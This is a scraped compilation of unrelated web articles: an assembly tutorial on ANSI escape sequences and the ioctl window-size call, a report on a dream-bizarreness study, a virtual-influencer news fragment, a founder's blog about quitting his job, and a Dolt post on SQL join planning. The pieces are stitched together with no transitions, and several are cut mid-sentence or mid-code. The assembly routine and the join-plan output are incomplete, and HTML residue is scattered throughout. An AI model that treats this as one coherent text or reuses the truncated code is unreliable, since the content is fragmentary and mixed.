<p><code>ESC</code> is represented by the well known <code>0x1b</code> <a href="https://en.wikipedia.org/wiki/C0_and_C1_control_codes#ESC">control byte</a> and the usage is as simple as using <code>printf</code> or <code>echo</code> to write the codes to <code>STDOUT</code> (keep in mind that the terminal you are using must support the ANSI sequences, look for <code>termcap</code> , <code>terminfo</code> and <code>infocmp</code> if you need).</p>

<p>There are some very good references for ANSI escape codes around the web, like the one at <a href="https://wiki.bash-hackers.org/scripting/terminalcodes">Bash Hackers Wiki</a>.</p>

<h3 id="code">Code</h3>

<p>While ANSI sequences are rather easy to use in any modern programming language, the same cannot be said for Assembly, mainly because the manual work involved when dealing with strings (I’m talking about pure Assembly, without including any external functions like <code>printf</code> and without invoking <a href="https://linux.die.net/man/1/tput">tput</a>).</p>

<p>Note that my code currently relies on <a href="https://man7.org/linux/man-pages/man2/ioctl.2.html">ioctl</a> Linux system call to manipulate special files (like terminals) but <a href="https://man7.org/linux/man-pages/man3/termios.3.html">termios</a> would be a better approach here instead and I have kept <strong>ioctl</strong> because I wanted to re-use some old code snippet I wrote long time ago, before I knew about <strong>termios</strong>. I imagine it should be fairly easy to make the change if you want to and I plan to do it in the future.</p>

<p>From <a href="https://man7.org/linux/man-pages/man4/tty_ioctl.4.html">ioctl_tty</a> man page:</p>





<p>
  

Use of ioctl makes for nonportable programs.  Use the POSIX interface described in termios(3) whenever possible.


</p>



<p>A little helper program written in <code>C</code> like the one below can be used display the terminal dimensions (rows and columns) with <code>ioctl</code>:</p>

<div><pre><code data-lang="C"><span>#include</span> <span>&lt;sys/ioctl.h&gt;</span><span>
</span><span>#include</span> <span>&lt;stdio.h&gt;</span><span>
</span><span>#include</span> <span>&lt;unistd.h&gt;</span><span>
</span><span></span>
<span>int</span> <span>main</span> <span>(</span><span>void</span><span>)</span> <span>{</span>
  <span>struct</span> <span>winsize</span> <span>ws</span><span>;</span>
  <span>ioctl</span> <span>(</span><span>STDIN_FILENO</span><span>,</span> <span>TIOCGWINSZ</span><span>,</span> <span>&amp;</span><span>ws</span><span>);</span>

  <span>printf</span> <span>(</span><span>"lines %d</span><span>\n</span><span>"</span><span>,</span> <span>ws</span><span>.</span><span>ws_row</span><span>);</span>
  <span>printf</span> <span>(</span><span>"columns %d</span><span>\n</span><span>"</span><span>,</span> <span>ws</span><span>.</span><span>ws_col</span><span>);</span>

  <span>return</span> <span>0</span><span>;</span>
<span>}</span></code></pre></div>

<p>Anyway, the example application I wrote will do the following:</p>

<ul>
<li>Save current terminal buffer (<code>ESC[?1049h</code>)</li>
<li>Clear screen (<code>ESC[2J</code>)</li>
<li>Invoke <code>ioctl</code> syscall to retrieve current window dimensions (rows and columns)</li>
<li>Use of the result from <code>ioctl</code> and perform some math to create a cursor, setting its rows and columns <code>(x, y)</code> position to more or less the center of the screen (<code>ESC[x;yH</code>)</li>
<li>Loop using <code>nanosleep</code> and <code>write</code> syscalls to simulate a <em>typewriter</em> effect while we write our message to the screen, byte by byte, including any extra ANSI sequences for formatting</li>
</ul>

<p>You can find the full commented source code with further instructions, all auxiliar functions and variable declarations on <a href="https://github.com/guitmz/ansi-escape">GitHub</a> but let’s go over the mentioned key steps above to understand it better.</p>

<ul>
<li>Saving current terminal buffer by writting <code>ESC[?1049h</code> (represented by <code>save_buffer</code>) to <code>STDOUT</code></li>
</ul>

<div><pre><code data-lang="nasm">    <span>lea</span> <span>rsi</span><span>,</span> <span>[</span><span>save_buffer</span><span>]</span>     <span>; loading rsi with ANSI code that saves current terminal buffer</span>
    <span>mov</span> <span>rdx</span><span>,</span> <span>save_buffer_size</span>  <span>; loading rdx with save ANSI code size</span>
    <span>mov</span> <span>rdi</span><span>,</span> <span>STDOUT</span>
    <span>mov</span> <span>rax</span><span>,</span> <span>SYS_WRITE</span>
    <span>syscall</span>                    <span>; saving current terminal</span></code></pre></div>

<ul>
<li>Clearing the screen by writting ESC[2J (represented by <code>clear_screen</code>) to <code>STDOUT</code></li>
</ul>

<div><pre><code data-lang="nasm">    <span>lea</span> <span>rsi</span><span>,</span> <span>[</span><span>cl</span><span>ear_screen</span><span>]</span>     <span>; loading rsi with ANSI code that clears screen</span>
    <span>mov</span> <span>rdx</span><span>,</span> <span>cl</span><span>ear_screen_size</span>  <span>; loading rdx with clear screen ANSI code size</span>
    <span>mov</span> <span>rdi</span><span>,</span> <span>STDOUT</span>
    <span>mov</span> <span>rax</span><span>,</span> <span>SYS_WRITE</span>
    <span>syscall</span>                     <span>; clearing the screen</span></code></pre></div>

<ul>
<li>Invoking <code>ioctl</code> syscall to retrieve terminal window size (this approach is not always guaranteed to give results and it’s safer to use it in conjunction to a lookup in the <code>termcap</code> database).</li>
</ul>

<div><pre><code data-lang="nasm">    <span>xor</span> <span>rdi</span><span>,</span> <span>rdi</span>         <span>; this means fd will be STDIN (same as "mov rdi, STDIN")</span>
    <span>mov</span> <span>rsi</span><span>,</span> <span>TIOCGWINSZ</span>  <span>; ioctl command to get window size</span>
    <span>mov</span> <span>rdx</span><span>,</span> <span>winsz</span>       <span>; winsz struct will contain terminal size information</span>
    <span>mov</span> <span>rax</span><span>,</span> <span>SYS_IOCTL</span>
    <span>syscall</span>
    
    <span>call</span> <span>create_cursor</span>   <span>; creating ANSI code that moves to proper coordinates (result format: "ESC[x;yH")</span></code></pre></div><p>
​       It will populate <code>winsz</code> struct with the result values. More information on the <code>TIOCGWINSZ</code> command can be found <a href="http://www.delorie.com/djgpp/doc/libc/libc_495.html">here</a></p>

<div><pre><code data-lang="nasm"><span>struc</span><span>t</span> <span>WINSZ</span>
    <span>.ws_row</span>     <span>dw</span> <span>?</span>     <span>; rows, in characters</span>
    <span>.ws_col</span>     <span>dw</span> <span>?</span>     <span>; columns, in characters</span>
    <span>.ws_xpixel</span>  <span>dw</span> <span>?</span>     <span>; horizontal size, pixels</span>
    <span>.ws_ypixel</span>  <span>dw</span> <span>?</span>     <span>; vertical size, pixels</span>
<span>ends</span></code></pre></div>

<ul>
<li>Creating the initial cursor we will use as starting point to write our message. Basically we divide the screen rows and columns by <code>3</code> in order to get a nice centralized final output. Feel free to play around with this denominator for different results. The function below will construct the <code>ESC[x;yH</code> string into <code>cursor_buffer</code> and replace <code>x</code> and <code>y</code> with the result of our small division, rounding up if needed</li>
</ul>

<div><pre><code data-lang="nasm"><span>create_cursor:</span>
    <span>lea</span> <span>rdi</span><span>,</span> <span>[</span><span>cursor_buffer</span><span>]</span>   <span>; loading [cursor_buffer] into rdi</span>
    <span>mov</span> <span>byte</span> <span>[</span><span>rdi</span><span>],</span> <span>ES</span><span>C</span>        <span>; the 'ESC' character</span>
    <span>inc</span> <span>rdi</span>                    <span>; advance [cursor_buffer]</span>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-5816" role="main">
<div>
<div>
<div>
<p>A <a href="https://www.sciencedirect.com/science/article/pii/S1053810020305389" target="_blank" rel="noreferrer noopener">new study</a> has found that the later it is, the more likely people are to have weird dreams.<span data-ez-name="psychnewsdaily_com-medrectangle-3"></span></p>
<p>The study adds to the <a href="https://amzn.to/2Kx7WKB" target="_blank" rel="noreferrer noopener">growing body of academic research on dreams</a>, a burgeoning field also known as <a href="https://en.wikipedia.org/wiki/Oneirology" target="_blank" rel="noreferrer noopener">oneirology</a>.</p>
<p>The study appeared on December 25 in the journal <em><a href="https://www.journals.elsevier.com/consciousness-and-cognition/" target="_blank" rel="noreferrer noopener">Consciousness and Cognition</a></em>. It was based on 68 students (58 of whom were female) at two universities in the United Kingdom. Their average age was 25. </p>
<h2>From crazy dreams to creepy dreams, and everything in between</h2>
<p>On two non-consecutive nights, a pre-programmed alarm clock woke the participants up four times throughout the night, at two-hour intervals. Upon each waking, they spoke into a digital audio device to record the contents any dream they might have been having. </p>
<p>The next morning, they listened to their recordings and completed a form that contained questions about each dream. The questions asked, for example, how bizarre the dream was on a scale of one to nine, how intense it was, how related the dream was to the dreamer’s waking life (past, present, or future), what emotions it conjured up, etc.<span data-ez-name="psychnewsdaily_com-medrectangle-4"></span></p>
<p>The average number of dreams that each participant recorded across the eight “awakenings” was about five.</p>
<p>The researchers, Josie Malinowski and Caroline Horton, grouped these dreams into two categories. The first consisted of “early night” dreams, consisting of dreams recorded after the two-hour and four-hour awakenings (in other words, dreams that took place during the first four hours of sleep). The second category consisted of “late night” dreams, recorded after the six-hour and eight-hour awakenings (i.e., during the second four hours of sleep). This categorization resulted in 173 early-night dreams and 177 late-night dreams.</p>
<h2>The wee hours are rife with weird dreams</h2>
<p>The results showed that late-night dreams were rated as substantially more bizarre and more metaphorical than early-night dreams. The participants also considered their late-night dreams more emotional, more intense, and more “important” than early-night dreams. Likewise, the late-night dreams were more likely to involve the distant past.</p>
<p>In contrast, the participants reported that their early-night dreams were more related to their waking life than the late-night dreams. The researchers found no differences between late-night and early-night dreams in terms of their stressfulness or negative valence.<span data-ez-name="psychnewsdaily_com-box-4"></span></p>
<p>The study also included several examples that the researchers say typify the early-night or late-night dreams of this sample group. One early-night dream, for example, was about the dreamer going on a shopping spree in a mall. In contrast, a typical late-night dream involved an exam session that morphed into a party with the party-goers clad in Victorian clothes, and where time itself was dancing.</p>
<h2>Bizarre dream images, new dream theories</h2>
<p>The fact that “dream-like” cognition increases in step with the amount of time spent asleep reflects “the change towards fluid, creative, and hyperassociative cognitive processes that underlie sleep towards the latter part of the night,” the researchers write.</p>
<p>And these differences in dream content may also relate to different sleep-related processes. The activation of memories during sleep, for example, <a href="https://www.frontiersin.org/articles/10.3389/fpsyg.2015.00874/full" target="_blank" rel="noreferrer noopener">probably has to do with memory consolidation</a>. Knowing more about how dream content changes over the course of the night “can provide insights into the nature of these processes of memory activation,” the authors write.</p>
<p>“Taken together, the increase in bizarreness, metaphoricity, and time orientation variance of late-night dreams show several ways in which late-night sleep cognition tends to be more fluid, creative, and associative than early-night dreams,” the study proposes.</p>
<p>Of course, this study reflects the dreams of a relatively small group of mostly young women based at British universities. As such, a broader sample pool might lead to different findings.</p>
<h2>“I have such funny dreams…” </h2>
<p>Likewise, the study is based entirely on the participants’ self-reports, in line with other <a href="https://www.psychnewsdaily.com/how-sharing-your-dreams-could-help-to-improve-your-relationships/" target="_blank" rel="noreferrer noopener">dream research</a>. But the researchers maintain that self-rating is the most appropriate method for determining the “bizarreness” of a dream. That is <a href="https://www.semanticscholar.org/paper/The-Problem-of-Dream-Content-Analysis-Validity-as-a-Schredl/34a69af866262c4514ecddf2ca2a72c5b6c451c2" target="_blank" rel="noreferrer noopener">because past research has found</a> that “external raters underestimate the amount of bizarreness in a dream in comparison to dreamers’ own ratings.” This finding can be confirmed by anyone who has ever listened to a description of someone else’s ostensibly weird dreams.</p>
<p>But the fact that someone describes a given dream as weird is fully understandable. The “intense (hyper)connectivity” of some dreams, the study writes, “may bring together memories, thoughts, and experiences from seemingly unrelated components of the dreamer’s life.”</p>
<p>The authors suggest future research could investigate whether people with more bizarre dreams also score higher on creativity measurements.</p>

The more she followed the lifelike character <a href="https://www.instagram.com/lilmiquela/?hl=en"><u>Miquela</u></a>, the more Jacobson found her persona to be relatable.</p>  <p>Miquela, a 19-year-old self-described "robot," mixes humour with "reality TV style drama" and personal diary-like posts, Jacobson, in Chicago,&nbsp;said. "In a weird way, she's very human."</p>  <p>Such is the allure of virtual influencers: sometimes cartoonishly fake, sometimes strikingly true to life, but always engaging to their audience. And that's what they're made to do: keep fans hooked.</p>  <p>For advertisers, it's proven a tantalizing combination. And amid a pandemic, virtual influencers have been increasingly hard to cast aside as a fad. Without any restrictions on their movements or activities, they've been able to do what "regular" human influencers simply cannot.</p>  <p>In just one <a href="https://www.instagram.com/p/CGiEASlnleT/?igshid=1oxepuotj7omz"><u>post</u></a> in October, Miquela posed in front of a McDonald's restaurant and wore brown Timberland-brand boots for her 2.9 million Instagram followers to see — highlighting the mainstream growth of an industry that was worth an <a href="https://www.businessinsider.com/influencer-marketing-report?r=AU&amp;IR=T"><u>estimated</u></a> $8 billion US in 2019 and could be on its way to nearly double by 2022.</p>    <p>It's hard to gauge the size of the industry in other terms; it's unclear how many characters have been created with the hope of scoring promotional contracts.</p>  <p><a href="https://www.virtualhumans.org/"><u>VirtualHumans.org</u></a>, which tracks the industry, says&nbsp;"hundreds" of virtual influencers have been created.&nbsp;Many boast hundreds of thousands — or millions — of fans on Instagram, TikTok, YouTube and other platforms. A recent <a href="https://hypeauditor.com/blog/the-top-instagram-virtual-influencers-in-2020/"><u>report</u></a> by the Hype Auditor, a social media analytics firm, suggested virtual influencers "have almost three times the engagement rate of real influencers," a measure of audience involvement.</p>  <p>In 2020, "with a lot of the regular entertainment world shut down, it's been a good time" for the characters, said Paul Budnitz, CEO of Superplastic, a Vermont-based firm that has its own collection of digital online figures. Budnitz describes it as "a management company for animated celebrities."&nbsp;</p>  <p>"They're not going to give anyone COVID-19," he said.</p>  <p><em><strong>WATCH: Virtual influencer Miquela's music video, </strong></em><strong>Speak Up.</strong></p>  <p><span><span><iframe src="https://www.youtube.com/embed/Rz8lxRxdwig" frameborder="no" title="YouTube content" allowfullscreen=""></iframe></span></span></p>  <p>Jacobson, who recently obtained a sociology degree from Iowa's Loras College, focused on the computer-generated characters for her final year project, "A Deep Dive into the World of Virtual Influencers."</p>  <p>Her conclusion? "It's not as clear [whether]&nbsp;this is a good trend or a scary trend," Jacobson said in an interview. "There's a lot of grey area here."</p>  <p>Indeed, the digital trend is raising questions in the real world about cultural appropriation and transparency.</p>  <p>Popular avatars often have a creative team behind them, designing their clothes, writing their social media posts and signing the promotional deals that make the character lucrative.</p>  <p>But to observers, it can get <a href="https://www.newyorker.com/culture/culture-desk/shudu-gram-is-a-white-mans-digital-projection-of-real-life-black-womanhood"><u>uncomfortable</u></a> when the humans making the money have no clear connection to the character they're creating, particularly when the avatar is meant to appear as a person of colour.</p>  <p>Take for instance the self-described "first virtual supermodel," <a href="https://www.instagram.com/shudu.gram/?hl=en"><u>Shudu</u></a>. Portrayed as a tall, slim Black woman, the character was in fact <a href="https://www.newyorker.com/culture/culture-desk/shudu-gram-is-a-white-mans-digital-projection-of-real-life-black-womanhood"><u>created</u></a> by a white man.</p>  <p>Other virtual influencers regularly <a href="https://www.virtualhumans.org/article/virtual-influencers-speak-out-in-response-to-the-murder-of-george-floyd"><u>post</u></a> messages highlighting social issues, such as the Black Lives Matter campaign, while avoiding the backlash real-life supporters have faced.</p>    <p>"The creator behind a virtual character might not be ... connected with the character," said Ruby Chan, a Hong Kong-based digital artist who goes by "Ruby 9100m" <a href="https://www.instagram.com/ruby9100m/?hl=en"><u>online</u></a>.&nbsp;</p>  <p>Sensing the rise in popularity of virtual influencers as early as 2015, she created a computer-generated avatar to replace her own real-life influencer persona.

With 1.4 million followers on Instagram, Guggimon gets more traction on the platform than the NHL's <a href="https://www.instagram.com/canadiensmtl/?hl=en"><u>Canadiens</u></a> but far fewer than another Quebec star, <a href="https://www.instagram.com/celinedion/"><u>Céline Dion</u></a>.&nbsp;</p>    <p>"I don't feel like the experience is any different than following … a regular human celebrity," Budnitz said. "The difference is the narrative leaves what we call 'standard reality' sometimes."</p>  <p>He said his firm's virtual stars have "pretty giant media projects" coming soon, involving film and streaming.&nbsp;</p>  <p>Guggimon toys are known to sell out quickly after they're put on sale.

      <div>

        

        

        

        <p>As many of you already know, I recently decided to quit my job and go full time on <a target="_blank" href="https://www.getcyberleads.com/"><u>Cyberleads</u></a>.</p>

        <p>It's been a long time coming. I launched Cyberleads nearly one year ago. But it's been three years since I first started building products and dreaming about this moment.</p>

        <p>If you want the full story of how this all unfolded, you can read <a target="_blank" href="https://www.alexwest.co/two_and_a_half_years"><u>this blog post</u></a>.</p>

        <p>But this blog post is different. It's an attempt to answer the simple question I have been asked by many people.</p>

		<p>"Why did you decide to quit your job now? What changed?"</p>

		<p>Well, here are my reasons.</p>


        

        

        <p>You can worry all you want. And you can come up with new excuses also. It’s easy.</p>

        <p>But numbers don’t lie. Cyberleads has made more than my salary six months in a row.</p>

        <p>Even though my systems are not ideal. Even though I still don’t feel like I’m standing on solid ground.</p>

        <p>- Twitter is my main acquisition channel, which is unstable.<br>- I’m in a market with high churn.<br>- My revenue is wild and fluctuates.<br>- My growth is not as smooth as I would like it to be.<br>- People compete with me all the time.<br>- I make myself vulnerable by sharing all my numbers and strategies.</p>

        <p>And much more. I could make up excuses all day long.</p>

        <p>But numbers don’t lie.</p>

        <p>My growth may be wild and unpredictable (because of the nature of social media) - but you can’t put a saddle on a beast. Actually, you shouldn’t. You should embrace it.</p>

        <p>In a perfect world, I would like to have predictable, scalable systems that work while I sleep.</p>

        <p>Be in market with super low churn and customer lock in. Have SEO for customer acquisition. Have smooth, predictable, stable growth. Have MRR as my main metric.</p>

        <p>But we don’t live in a perfect world.</p>

        <p>I have to adjust, and look at things the way they are.</p>

        <p>Yes, my business is wild. But it has been growing <b><u>consistently</u></b>.</p>


        

        

        <p>For years I thought that I loved coding. As soon as I started working as a software engineer, I realized that I didn't love coding, but creating. Software was just my tool of choice up until then.</p>

        <p>Writing unit tests and coding internal dashboards is not what I call peak creativity.</p>

        <p>Writing code for eight hours per day made me sick of it. Actually, that's the reason why many parts of Cyberleads are built with no-code tools.</p>

        <p>Also, meetings about scalability, legacy codebases, updating our Kubernetes clusters and sharding our databases for peak performance were not my thing either.</p>

        <p>The only thing I enjoyed talking about were product related stuff. Competition. Positioning. Features we should add or remove. Funding. Lucrative markets.</p>

        <p>Higher level stuff. Not tweaking and perfecting small components of larger systems.</p>

		<p>Maybe I'm not an engineer at heart.</p>

        

        

        <p>I hardly learned any new technical stuff. I just wasn't interested.</p>

        <p>The things I learned and took with me were all intangible.</p>

        <p>1. Like seeing what companies look like. Understanding that they are slow. That it's not scary to compete with them. And that most employees are lazy, including myself.</p>

        <p>2. Or flipping my priorities 180 degrees. Instead of wanting to create a unique product that changes the world, I decided to change my world first. Make money and escape the rat race. Then, I can worry about changing the rest of the world also.</p>

        <p>3. Or understanding that I don't have to work all day to progress. I only worked for two hours per day, and I made those hours count. Two hours were enough. It was mind blowing.</p>

        <p>But, I learned those things straight away. In the first 2-3 months.</p>

        <p>After that, I was just coding dashboards.</p>

    	

        

        <p>After learning all that I had to learn, my day job became mundane. I was present in meetings, and executed tasks that were assigned to me.</p>

		<p>The only thing it gave me was a salary. That's it.</p>

		<p>When I focused on my day job, Cyberleads' growth would slow down.</p>

		<p>When I focused on Cyberleads, my performance would dip at my day job.</p>

		<p>It was impossible to do great work, at both, at the same time.</p>

		
		
		<p>There was a specific day that changed everything for me.</p>

		<p>It was the day I realized that Cyberleads' monthly revenue surpassed my monthly salary. That happened in late July.</p>

		<p>I shared it on Twitter, and things blew up there as well, resulting to even greater revenue.</p>

		<p>Many people congratulated me and commented small nuggets of wisdom. But there is one specific comment that I will never, ever forget.</p>

		<p>I'm paraphrasing, but it went something like this:</p>

		<p>"You’ll never be able to go back now. It’s one of those things that once you see it, you can never unsee it again. It happened to me as well. Many, many years ago."</p>

		<p>I gained confidence. I knew there was another way now. And I knew that my days working for someone else were limited.</p>

		<p>Every meeting. Every performance review. Every 1 on 1 with my manager. They all seemed meaningless.</p>

		<p>I will never forget one day specifically, when my manager asked me what I want to achieve in the future. I didn’t know if he meant personally, professionally or specifically within the company, so I asked for an example.</p>

		<p>With a smile on his face, as if he was proposing something I could not possibly resist, he told me:</p>

		<p>“For example, you may want to become the respected, go-to guy for the `X company dashboard`.”</p>

		<p>What. The. Fuck. At that moment, I wanted to laugh. But to be honest, if I didn't have Cyberleads, I would probably want to cry.</p>

		
		
		<p>In this section I'll be quoting my favorite modern philosopher, Nassim Taleb.</p>

		<p>His books really changed my perspective on risks, randomness and life.</p>

		<p>Life is chaotic. And you shouldn't try to change that. Embrace it's unpredictability and make it work for you. Not against you.</p>

		<p>You will have to take risks. But not all risks are the same.</p>

		<p>With some risks, you should be super conservative.
		Risks that will ruin you if they go wrong.</p>

		<p>Like taking a loan. Or robbing a bank. Or quitting your job with no money aside. Or having unprotected sex with a `sex worker`. You get the point.</p>

		<p>Take enough of these risks, and you will be lead to ruin.</p>

		<p>But with other risks, you should be the opposite. Wild, experimental, and playful.
		Risks that won't ruin you if things go wrong. And that will bring you a lot of upside if they go right.</p>

		<p>Like starting a new business with zero capital. Or moving to another country. Or starting a new hobby. Or going to a party. Or, even tweeting. Best case scenario, you get customers, build an audience, and make friends. Worst case scenario.. well, there is none!</p>

		<p>Take enough of these risks, and you will be "blessed with luck".</p>

		<p>I loved this framework. Although I had been using it, I was never able to articulate or formalize it. I started thinking in it more deeply.</p>

		<p>What does leaving my day job look like?</p>

		<p>In which category of risks does it fall into?</p>

		<p>Can it lead me to ruin, if things go wrong? Or not?</p>

		
		


		<p>Instead of leaving straight away, I decided to stay at my day job.</p>

		<p>One reason was to honor the contract I had signed. I didn't want to leave the company and my team out of the blue.</p>

		<p>If I knew how they would treat me when leaving, I wouldn't had stayed. But anyway, at least I have my conscience clear.</p>

		<p>Another reason was to continue saving up money.</p>

		<p>I managed to set aside $50k. Which means that even if for some crazy reason I was to start making zero dollars per month starting from tomorrow, I would still have enough runway for 2-3 years.</p>

		<p>The $6k was from my late grandfather. Although he was a mere coal miner and a shoe mender, he would always save up a little bit of money for me and my siblings. We had no idea. Thank you grandpa. Even though you don't know it, you helped your grandson achieve his dreams.. ❤️</p>

		<p>The rest was from my day job, Cyberleads, and having a super low burn rate.</p>

		<p>So now we have:</p>

		<p>1. A business that's growing and consistently making more money than my salary.</p>

		<p>2. Two years of runway, if everyting goes to shit.</p>

		<p>If things go well, I am free for life. I gain my freedom. I scale Cyberleads. I travel the world. I set even more money aside.</p>

		<p>If not, and for some reason Cyberleads goes to zero, I still have two years of runway to figure things out.</p>

		<p>And again, even if for some even crazier reason I am completely incapable of generating a single dollar in the next two years, I can always just find another job and try again.</p>

		<p>At least I will have a cool story to tell, and I probably will have travelled a lot.</p>

		<p>Hmm.. That's a good bet. I'll take it.</p>

		
		

		<p>The number one reason I’m leaving my day job is to have a clear mind. To stop having to think about things that are irrelevant to Cyberleads. Like meetings. Or sprint deadlines. Or what my manager thinks of my performance.</p>

		<p>That being said, I'm not going to start working ten hours per day on Cyberleads, either.</p>

		<p>My goal, from the beginning, was freedom.</p>

		<p>Financial freedom. Location independence. Control of my time.</p>

		<p>The same way I don’t want to be dragged into meetings all day long, I don't want to work on Cyberleads all day long, either.</p>

		<p>Actually, I don't even think it's necessary.</p>

		<p>We live in the age of the internet. Infinite leverage. Your inputs can be multiplied millions of times.</p>

		<p>Taking a simple, correct decision and scaling it, is far more important than the number of hours your put in.</p>

		<p>A calm, clear mind will outperform any person or team, on the internet, that is running around like a headless chicken.</p>

		<p>I don’t want more time. I want clarity of mind.</p>


		
		

		<p>The last reason I want to quit my day job, is to feel alive.</p>

		<p>Sometimes you just want to throw yourself in the fire. This is one of those times.</p>

		<p>I want a big change. Similar to how this time …</p></div></div></div>

<![CDATA[Implementing join planning in our open source Golang SQL query engine]]>

December 28, 2020 | https://www.dolthub.com/blog/2020-12-28-join-planning/ | <a href="https://web.archive.org/web/*/https://www.dolthub.com/blog/2020-12-28-join-planning/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-cy="blog-post-text">
<p><a href="https://github.com/dolthub/dolt/">Dolt</a> is Git for Data. It's a SQL
database that you can clone, fork, branch, and merge. Dolt's SQL
engine is
<a href="https://github.com/dolthub/go-mysql-server/">go-mysql-server</a>, and
today we're going to discuss how it implements join planning to make a
query plan involving multiple tables as efficient as possible.</p>

<p>When a query involves more than one table, there are many different
ways to access those tables to get a correct result. But some ways are
much faster than others! Choosing an order to access tables in and a
strategy to assemble result rows is known as join planning. This is
easiest to explain with an example.</p>
<p>Let's create three tables to track the populations of cities and
states, and the people who live in them. If you have Dolt installed
(link in the sidebar), you can follow along.</p>
<div data-language="sql"><pre><code><span>%</span> mkdir <span>join</span><span>-</span>planning <span>&amp;&amp;</span> cd <span>join</span><span>-</span>planning
<span>%</span> dolt init
Successfully initialized dolt <span>data</span> repository<span>.</span>
<span>%</span> dolt <span>sql</span>



join_planning<span>&gt;</span> <span>create</span> <span>table</span> states <span>(</span>name <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>primary</span> <span>key</span> <span>not</span> <span>null</span><span>,</span> population <span>int</span> <span>unsigned</span><span>)</span><span>;</span>
join_planning<span>&gt;</span> <span>create</span> <span>table</span> cities <span>(</span>name <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>primary</span> <span>key</span> <span>not</span> <span>null</span><span>,</span> state <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>not</span> <span>null</span><span>,</span> population <span>int</span> <span>unsigned</span><span>)</span><span>;</span>
join_planning<span>&gt;</span> <span>create</span> <span>table</span> people <span>(</span>name <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>primary</span> <span>key</span> <span>not</span> <span>null</span><span>,</span> city <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>not</span> <span>null</span><span>)</span><span>;</span></code></pre></div>
<p>Let's say that we want a list of people named "John Smith" along with
names and populations of the cities and states they live in. We would
write a query like this:</p>
<div data-language="sql"><pre><code><span>select</span> <span>*</span> <span>from</span> people p 
    <span>join</span> cities c <span>on</span> p<span>.</span>city <span>=</span> c<span>.</span>name 
    <span>join</span> states s <span>on</span> s<span>.</span>name <span>=</span> c<span>.</span>state 
    <span>where</span> p<span>.</span>name <span>=</span> <span>"John Smith"</span><span>;</span></code></pre></div>
<p>There's lots of ways that a query planner could execute this query. A
really bad way would be to look at every combination of every row from
all three tables and test each combination to see if it matches the
<code>JOIN</code> condition and <code>WHERE</code> clause. This is correct and valid, but
very expensive. If we say that the <code>states</code>, <code>cities</code> and <code>people</code>
tables contain <code>S</code>, <code>C</code> and <code>P</code> rows respectively, this query plan
(which is called a cross join), will result in <code>S * C * P</code> row
accesses and comparisons. It's a bad idea. </p>
<p>There are simple tricks you can use to speed up query execution. Using
<a href="https://www.dolthub.com/blog/2020-10-28-pushdown-filters/">pushdown
optimization</a>,
you can eliminate most of the accesses to the <code>people</code> table. Let's
say that the number of "John Smiths" in the database is called <code>J</code>,
and it's much smaller than <code>P</code>. Then using pushdown intelligently
reduces the cost of our access to <code>S * C * J</code>.</p>
<p>Until a few weeks ago, this was as good as
<a href="https://github.com/dolthub/dolt/">Dolt</a> could do on joins of three or
more tables. For two tables, we would use an index if available. But
for three, no luck. It made the product borderline unusable for a
workload with this query pattern and a non-trivial data size.</p>
<p>This blog post is about how we optimized the join planner to generate
more intelligent, efficient query plans for any number of tables. In
today's version of <a href="https://github.com/dolthub/dolt/">Dolt</a>, that same
query will generate the following query plan:</p>
<div data-language="sql"><pre><code>join_planning<span>&gt;</span> <span>explain</span> <span>select</span> <span>*</span> <span>from</span> people p 
    <span>join</span> cities c <span>on</span> p<span>.</span>city <span>=</span> c<span>.</span>name 
    <span>join</span> states s <span>on</span> s<span>.</span>name <span>=</span> c<span>.</span>state

<p>The plan starts with an indexed access on the <code>name</code> column of
<code>people</code> to find all the John Smiths. Then for each row, it uses a
primary key index to look up the city. Then for each city, it uses
another primary key to look up the state. In all, this leads to a
total query cost of <code>J * 3</code>. </p>
<h2>Is that... a lot?</h2>
<p><img src="https://www.dolthub.com/blog/1e2adb7b32ddb47442f1c254bf2358ed/is-that-a-lot.gif" alt="Is that a lot?"></p>
<p>Using some real numbers to drive this home: let's use the US and say
that there are 330,000,000 <code>people</code> rows, 20,000 <code>cities</code> rows, and 52
<code>states</code> rows (we didn't forget you, DC and Puerto Rico). A cross join
query plan would access a number of rows equal to the product of these
numbers, which is roughly 343 trillion accesses. It's a big
number. Your query isn't going to complete.</p>
<p><a href="http://howmanyofme.com/#:~:text=The%20U.S.%20Census%20Bureau%20statistics,Smith%20in%20the%20United%20States.">There are about 48,000 people named John
Smith</a>
in the US. So using pushdown optimization gets us down to about 50
billion row accesses. This is a lot better than before, but still
terrible. The query isn't returning.</p>
<p>Using both pushdown to the <code>people</code> table and indexed accesses to
<code>cities</code> and <code>states</code>, on the other hand, limits the query execution
to only 48,000 accesses to the <code>people</code> table, then 1 access to each of
the <code>cities</code> and <code>states</code> table for each of these rows. That's <code>3 *
48,000</code>, or 144,000 table accesses total.</p>

<p>Unlike in the <a href="https://www.dolthub.com/blog/2020-10-28-pushdown-filters/">pushdown
blog</a>, I
won't bother to spell out the percentage savings. We're looking at 4
decimal orders of magnitude improvement for the first optimization,
then another 5 for the second. It's the difference between
<a href="https://github.com/dolthub/dolt/">Dolt</a> being a usable query engine
or a bad space heater.</p>

<p>To assemble an efficient query plan, you have to start by by answering
one really important question:</p>
<blockquote>
<p>What order should we access the tables in?</p>
</blockquote>
<p>This really makes all the difference. In the example above, a table
access order of <code>people &gt; cities &gt; states</code> lets us use the primary key
index on the latter two tables. If we instead chose the order <code>states &gt; cities &gt; people</code>,
we can't use the information from earlier tables
to reduce the number of lookups into later tables, giving us a cross join.</p>
<p>There are a lot of interesting details to get wrong, but to get table
order right you can use some pretty simple heuristics.</p>
<ol>
<li><strong>What index could I use</strong> to access this table? Are those columns part
of a join condition?</li>
<li><strong>Are required columns available to use as a key</strong>? Did the other tables
in the join condition precede this one?</li>
<li><strong>How many rows are in this table</strong> if I need to do a full table scan?</li>
<li><strong>Is this a <code>LEFT</code> or <code>RIGHT</code> join</strong>, and if so, is this table on the
side of the join that requires it to come first?</li>
</ol>
<p>We'll come back to the actual implementation of the table ordering
algorithm later. For now let's assume its existence, and it tells us
which order to access tables in. How do we build a join plan with that
access order?</p>

<p>In <a href="https://github.com/dolthub/go-mysql-server/">go-mysql-server</a>,
query plans are organized in a tree of <code>Node</code> objects. As of now, all
nodes have at most two children, making the query plan a binary-ish
tree. A <code>Join</code> node knows how to get a row from its left child, then
